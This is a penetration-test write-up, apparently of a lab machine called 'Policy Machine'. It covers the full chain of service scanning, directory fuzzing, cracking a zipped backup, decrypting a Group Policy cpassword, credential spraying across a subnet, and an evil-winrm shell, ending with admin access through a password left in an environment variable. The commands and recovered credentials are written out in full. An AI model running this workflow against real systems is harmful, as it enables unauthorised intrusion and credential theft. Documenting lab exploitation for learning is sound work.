# Technical Exploitation Report -- Policy Machine

## Technical Summary

This technical report documents the full penetration test performed against the target virtual machine.

---

## 1. Connectivity Verification

The assessment began by checking host availability through an ICMP test:

```bash
ping 192.168.0.23
```

<img width="1012" height="413" alt="image" src="https://github.com/user-attachments/assets/6733248c-c649-4c31-88d7-690b8f20b38d" />

**Observations:**

- 6 packets transmitted and received, 0% packet loss.
- Consistent latency.
- The host was active and reachable, so enumeration could begin.

---

## 2. Enumeration of Exposed Services

A port scan with version detection and basic scripts was performed:

```bash
nmap -sS --open -sC -sV -n -Pn 192.168.0.23
```

<img width="911" height="453" alt="image" src="https://github.com/user-attachments/assets/e38fe08b-900d-45ce-8bcc-a5ca379a5154" />

**Relevant services identified:**

| Port | Service | Version |
|---|---|---|
| 80/tcp | HTTP | Microsoft IIS 10.0 |
| 135/tcp | MSRPC | Windows RPC |
| 139/tcp | NetBIOS-SSN | Windows File Sharing |
| 445/tcp | Microsoft-DS | Windows File Sharing |
| 5985/tcp | HTTP | Microsoft HTTPAPI 2.0 (WinRM) |

**Professional interpretation:**

- Port 80 is often a starting point in lab environments; credentials or configuration data are sometimes exposed through the web service.
- SMB and WinRM ports allow remote enumeration and possible privilege escalation if valid credentials are found.

---

## 3. Web Service Analysis

The web application was reviewed manually using the browser and developer tools (F12) to detect:

- HTML comments.
- Possible hidden endpoints.
- Exposed APIs.

<img width="710" height="353" alt="image" src="https://github.com/user-attachments/assets/2f65d2eb-7c0f-45ed-ab99-9ea4bf50f057" />

**Result:** No sensitive information was identified.

Technical decision: continue with automated directory enumeration to look for non-visible resources.

---

## 4. Web Directory Fuzzing

Forced enumeration was performed using `ffuf`:

```bash
ffuf -u http://192.168.0.23/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .zip,.bak,.old,.tar,.gz,.sql -fs 703
```

<img width="487" height="311" alt="image" src="https://github.com/user-attachments/assets/3bd00782-ea8c-4050-816a-e34d754f063f" />

<img width="484" height="325" alt="image" src="https://github.com/user-attachments/assets/24ed82bc-3361-4227-9096-21e2f918d256" />

**Professional justification:**

- **Extensions (`-e`)**: compressed files or backups may contain sensitive information.
- **Size filter (`-fs`)**: the web server returned repetitive 703-byte responses; filtering allowed the search to focus on meaningful files and remove false positives.

**Fuzzing result:**

- `groups.zip` was detected as an accessible file.

---

## 5. Download and Analysis of `groups.zip`

The file was downloaded and confirmed to be password protected:

<img width="553" height="321" alt="image" src="https://github.com/user-attachments/assets/1f4d5934-5fb7-4087-9a8a-ed5a9c2ece12" />

To recover the password:

1. A hash was generated with `zip2john`.
2. The archive was cracked with `John the Ripper` and wordlists such as `rockyou.txt`.

<img width="554" height="302" alt="image" src="https://github.com/user-attachments/assets/c8b436b7-9e30-4dad-b918-295f6ba69dca" />

<img width="535" height="405" alt="image" src="https://github.com/user-attachments/assets/fb074c72-b973-433d-b4f5-e4a44a7f537e" />

**Result:** the password was recovered and the `.tar` file was extracted.

Inside, an XML file was found containing:

```xml
<User clsid="" name="policy.nyx\XEROSEC">
  <Properties action="U" newName="" fullName="" description="" cpassword="IwLNLy0Ck5xIlXEsPMTbOF1f/NnliQFKeGv139eUEgE"/>
</User>
```

---

## 6. Decryption of the `cpassword`

`gpp-decrypt` was used to decrypt the Group Policy Preferences password:

```bash
gpp-decrypt IwLNLy0Ck5xIlXEsPMTbOF1f/NnliQFKeGv139eUEgE
```

<img width="518" height="226" alt="image" src="https://github.com/user-attachments/assets/68d2a564-e2b2-4849-8dab-ed7cf6562ae9" />

**Result:**

- User: **XEROSEC**
- Password: **GPP2k26blahblah**

---

## 7. Validation with Enum4Linux

Before using WinRM, SMB information was validated with the recovered credentials:

```bash
enum4linux -u XEROSEC -p 'GPP2k26blahblah' 192.168.0.23
```

<img width="595" height="391" alt="image" src="https://github.com/user-attachments/assets/95d9bdae-e168-4c8c-8e78-da499972f916" />

<img width="715" height="348" alt="image" src="https://github.com/user-attachments/assets/b020bda8-2057-4169-9f32-2e0e05e956e1" />

**Professional result:**

- Confirmation that the target was a **standalone workstation**, not an Active Directory environment.
- Workgroup and accessible user information were identified.
- No critical shares or domain-related settings were found that could enable further escalation.

---

## 8. Advanced SMB Validation and Enumeration

Authentication was tested with `netexec` over the local /24 network:

```bash
netexec smb 192.168.0.0/24 -u XEROSEC -p 'GPP2k26blahblah'
```

<img width="751" height="546" alt="image" src="https://github.com/user-attachments/assets/946fc262-a5d9-4cac-8411-20943b8d99bf" />

**Professional interpretation:**

- Only one host responded with valid credentials.
- Shared resources: `ADMIN$`, `C$`, `IPC$`, but no useful files were found for escalation.
- Final confirmation that this was a **single independent machine**.

**Manual checks:** `net user` and user/group listings did not provide additional relevant information.

<img width="657" height="500" alt="image" src="https://github.com/user-attachments/assets/f8922cc0-a019-4b15-8d74-108cd9ee9117" />

---

## 9. Remote Access via WinRM

Given that port 5985 was open and valid credentials were available, a session was established with `evil-winrm`:

```bash
evil-winrm -i 192.168.0.23 -u XEROSEC -p 'GPP2k26blahblah'
```

<img width="1112" height="553" alt="image" src="https://github.com/user-attachments/assets/e6995045-40f1-4cb4-b9c8-5fb557f34b63" />

Context verification:

```bash
whoami
whoami /groups
```

<img width="1105" height="550" alt="image" src="https://github.com/user-attachments/assets/9d25498e-6f04-4a08-8197-fa32cd09a1b2" />

The user did not have full administrative privileges.

---

## 10. Automated Enumeration with WinPEAS

WinPEAS was uploaded and executed for deeper analysis:

```bash
upload winPEASx64.exe
./winPEASx64.exe
```

<img width="1132" height="563" alt="image" src="https://github.com/user-attachments/assets/5f57a831-a7b9-427d-9e2d-28d3c7050151" />

**Relevant result:** an environment variable exposed a password:

```text
GigaAdmin123!
```

<img width="1142" height="507" alt="image" src="https://github.com/user-attachments/assets/3730b5a0-3abd-4c19-a478-0f68b1e4daf7" />

---

## 11. Privilege Escalation and Full Access

The exposed password was used to authenticate as **Administrator**:

<img width="1125" height="560" alt="image" src="https://github.com/user-attachments/assets/1c5009a1-ff29-4bea-b7c7-b8ed8a76f608" />

Privilege verification:

```bash
whoami /priv
```

**Conclusion:** full system control was achieved.

---

## Technical Conclusion

**Critical factors that enabled the intrusion:**

- Sensitive file exposure through the web (`groups.zip` containing GPP data).
- Poorly protected stored passwords.
- Credential reuse.
- Open and reachable WinRM service with valid credentials.
- Environment variables containing critical information.

**Lessons learned and best practices:**

- Always review web exposure and possible compressed backup files.
- Validate GPP security and ensure no `cpassword` values are exposed.
- Manual enumeration before automation helps understand the context and reduce noise.
- Documenting each step with evidence makes professional reporting much easier.
